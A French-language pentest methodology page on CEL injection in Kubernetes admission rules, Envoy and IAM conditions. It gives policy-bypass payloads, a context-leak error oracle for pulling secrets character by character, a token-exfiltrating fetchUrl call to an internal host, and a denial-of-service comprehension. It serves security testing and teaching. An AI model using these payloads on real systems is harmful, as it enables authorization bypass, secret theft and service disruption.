---
title: "Injection Common Expression Language et contournement de politique"
description: "CEL est un évaluateur en sandbox, non Turing-complet ; l'injection dans les expressions d'admission, d'autorisation et de validation infléchit les décisions de politique, divulgue le contexte et abuse des fonctions enregistrées par l'hôte."
keywords:
  - injection CEL
  - Common Expression Language
  - contournement de politique
  - contrôle d'admission
  - cel-go cel-python
  - divulgation de contexte
---

# Common Expression Language

Common Expression Language (CEL) est un langage d'évaluation embarqué dans des hôtes tels que les règles d'admission et de validation Kubernetes, Envoy et les expressions de condition IAM, avec cel-go et cel-python comme runtimes courants. Il est en sandbox par conception : non Turing-complet, sans boucles, sans imports, sans entrée fichier ou réseau, et sans mécanisme pour atteindre du code arbitraire. Il n'y a aucune exécution de commande inhérente à trouver ici. S'attendre à un équivalent d'`os.system` est le mauvais modèle, et en chercher un gaspille la mission.

Ce que l'injection CEL procure réellement, c'est le contrôle d'une décision. Une expression CEL renvoie une valeur, généralement un booléen qu'un contrôleur d'admission, un service d'autorisation ou un validateur consomme. Lorsqu'une entrée d'attaquant atteint la chaîne d'expression ou les variables liées dans son contexte d'évaluation, la cible est cette valeur renvoyée : faire qu'un contrôle d'autorisation s'évalue à vrai, faire qu'une règle de validation s'évalue à vrai pour une entrée qu'elle était censée rejeter, ou relire le contexte que l'expression peut voir. Les effets de bord n'existent que là où l'hôte a enregistré une fonction personnalisée à effets de bord, qui est l'unique chemin vers quoi que ce soit au-delà d'une décision.

## Le puits

CEL est dangereux au même endroit que tout langage évalué : là où le texte de l'expression est assemblé à partir d'une entrée plutôt que fixé par l'opérateur.

```go
// expression string built from user-controlled data
env, _ := cel.NewEnv(cel.Variable("user", cel.MapType(cel.StringType, cel.DynType)))
ast, _ := env.Compile("user.role == '" + role + "' && user.tenant == 'acme'")
prg, _ := env.Program(ast)
out, _, _ := prg.Eval(map[string]any{"user": claims})
```

Ici `role` atterrit à l'intérieur d'un littéral de chaîne CEL exactement comme un breakout de chaîne SQL ou JavaScript, et les opérateurs propres à CEL sont disponibles une fois le guillemet fermé.

## Forcer la décision

Le résultat de plus grande valeur est de faire qu'une politique s'évalue à l'avantage de l'attaquant. Fermez le littéral et court-circuitez le booléen pour que l'expression entière soit vraie indépendamment des valeurs réelles. CEL vérifie statiquement le type de chaque opérande, donc l'injection doit laisser le texte de template restant bien typé : terminez-la de sorte que le guillemet fermant du template complète une comparaison booléenne, pas une chaîne nue :

```
' || true || 'x'=='x
' || 1==1 || 'x'=='x
```

Le premier transforme le prédicat en `user.role == '' || true || 'x'=='x' && user.tenant == 'acme'`. Chaque opérande est booléen, donc cela vérifie le type, et comme `||` court-circuite sur `true`, l'autorisation renvoie vrai pour tout appelant. L'inverse est tout aussi utile contre une règle censée rejeter quelque chose : forcez l'expression de validation à faux pour que la garde ne se déclenche jamais, en gardant là encore la queue bien typée :

```
' && false || 'x'!='x
```

Là où l'expression est une fonction ou une macro plutôt qu'une comparaison plate, les constructions propres à CEL réécrivent la logique. Les macros comme `has()`, `size()` et les compréhensions de liste/map (`all`, `exists`, `exists_one`, `map`, `filter`) sont les leviers :

```
user.roles.exists(r, true)
user.groups.all(g, true)
```

Un `exists` forcé à vrai, ou un `all` sur un ensemble vide (qui renvoie vrai par vacuité), retourne un contrôle d'appartenance que l'auteur de la politique supposait contraignant pour l'accès.

## Divulgation de contexte

L'expression peut lire chaque variable liée dans son contexte d'évaluation, qui est fréquemment plus riche que l'unique champ utilisé par la politique. Là où une partie quelconque du résultat d'évaluation, un message d'erreur ou une branche en aval renvoie une valeur, l'expression injectée devient une primitive de lecture sur le contexte :

```
user.token
object.spec.template.spec.containers[0].env
request.headers['authorization']
```

Les erreurs d'évaluation CEL sont un oracle courant : indexer une clé manquante, diviser par zéro ou convertir des types lève une erreur à l'exécution dont la présence ou le message divulgue la structure. Associez un test booléen sur une valeur de contexte à une erreur pour construire un oracle, de la même façon qu'une injection à l'aveugle confirme un bit à la fois :

```
user.secret.startsWith('a') ? '' : user.missing_field_forces_error
```

Si `secret` commence par `a`, l'expression renvoie vide et l'évaluation réussit ; sinon la référence à un champ manquant lève une erreur. Le fait que la requête lève une erreur répond à la supposition, récupérant la valeur caractère par caractère sans qu'aucune valeur ne soit jamais imprimée.

## Abuser des fonctions enregistrées par l'hôte

L'unique voie vers un effet de bord est une fonction que l'hôte a liée dans l'environnement CEL. Les runtimes livrent des bibliothèques d'extension et les applications enregistrent les leurs, et une fonction qui va au-delà du calcul pur est l'exception qu'il vaut la peine de traquer. Là où l'hôte a enregistré des helpers réseau, DNS, de lookup ou de formatage, une expression injectée les appelle :

```
getUser(attackerControlledId)
fetchUrl('http://10.0.0.5/' + user.token)
```

Rien dans le CEL de base ne fournit ces fonctions, donc la technique consiste d'abord à énumérer ce que l'environnement déclare (les enregistrements `cel.Function`/`cel.Declarations` de l'hôte, ou le jeu de fonctions documenté de la politique d'admission) puis à exercer toutes celles qui touchent aux E/S, aux lookups de données ou à l'état privilégié. Même les helpers purs comptent : une fonction de formatage de chaîne ou de regex exposée à une entrée d'attaquant peut provoquer un épuisement de ressources.

## Abus de ressources et de complexité

CEL plafonne le coût en principe, mais là où l'hôte n'a pas fixé de limite de coût ou l'a fixée généreusement, une expression conçue à dessein gonfle le travail d'évaluation. Les compréhensions imbriquées sur des listes, qui multiplient le travail par élément, et les macros profondément imbriquées augmentent le CPU et la mémoire durant l'évaluation (CEL n'a pas d'opérateur de répétition de chaîne, donc le coût vient de l'itération, pas du gonflement d'une seule valeur) :

```
[0,1,2,3,4,5,6,7,8,9].map(a, [0,1,2,3,4,5,6,7,8,9].map(b, [0,1,2,3,4,5,6,7,8,9].map(c, c)))
```

Une évaluation non bornée ou faiblement bornée est un levier de déni de service contre le chemin d'admission ou d'autorisation qui exécute l'expression, lequel est souvent dans le chemin critique de la requête pour chaque appel d'API.

## Outils

- Tests manuels avec Burp Repeater ; payloads conçus par moteur.
- **Burp Intruder** : itérer des sondes d'oracle booléen pour récupérer les valeurs de contexte caractère par caractère.

## Références

- [CEL specification](https://github.com/google/cel-spec)
- [cel-go](https://github.com/google/cel-go)
- [Kubernetes: CEL validation rules](https://kubernetes.io/docs/reference/using-api/cel/)
- [CEL language definition](https://github.com/google/cel-spec/blob/master/doc/langdef.md)
